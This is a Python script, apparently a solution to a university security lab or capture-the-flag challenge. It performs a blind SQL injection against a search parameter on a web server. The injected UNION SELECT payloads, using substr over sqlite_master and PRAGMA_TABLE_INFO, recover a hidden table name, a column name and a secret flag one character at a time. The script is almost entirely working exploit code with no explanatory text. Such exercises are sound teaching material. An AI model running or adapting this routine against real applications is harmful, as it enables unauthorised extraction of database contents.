import requests

SERVER = f'http://mustard.stt.rnl.tecnico.ulisboa.pt:22262/?'

list_upper = list(map(chr,range(ord('A'),ord('Z')+1))) #print(list_upper)

list_lower = list(map(chr,range(ord('a'),ord('z')+1))) #print(list_lower)

list_upper_lower =  list_upper + list_lower + ['_'] + ['{', '}'] #print(list_upper_lower)

#Find the length of table
""" params = {'search' : "'union select null, null, null from sqlite_master where length(tbl_name)=19--"}"""
i=1
table_name = ""
while i<20:
    for letter in list_upper_lower:
        
        #find name of table
        params = {'search' : f"'union select null, name, null from sqlite_master where substr(tbl_name,{i},1)='{letter}'--"}
        #super_s_sof_secrets
        
        headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}

        r = requests.get(SERVER, params=params, headers=headers)

        if ("Found 5" in r.text):
            #print(r.text)
            table_name += letter; print(table_name)

    i+=1


#Find the column length
#'union select null, name, null from PRAGMA_TABLE_INFO('super_s_sof_secrets') where length(name)=6--
i=1; column_name = []; column_name_str = ""
while i<10:
    for letter in list_upper_lower:
        
        #find name of column
        params= {'search' : f"'union select null, name, null from PRAGMA_TABLE_INFO('super_s_sof_secrets') where substr(name,{i},1) = '{letter}'--"}
        #secret
        
        headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}

        r = requests.get(SERVER, params=params, headers=headers)

        if ("Found 5" in r.text):
            column_name += [f' pos= {i} letter {letter}']
            column_name_str += letter
            print(column_name_str)

    i+=1

#Find flag length
#'union select null, secret, null from super_s_sof_secrets where length(secret)=114--
i=1; flag = ""
while i<150:
    for letter in list_upper_lower:
        
        #find flag content
        params = {'search' : f"'union select null, secret, secret from super_s_sof_secrets where substr(secret,{i},1)='{letter}'--"}

        headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}

        r = requests.get(SERVER, params=params, headers=headers)

        if ("Found 5" in r.text):
            
            #print(r.text)
            flag += letter
            print(flag)

    i+=1

        
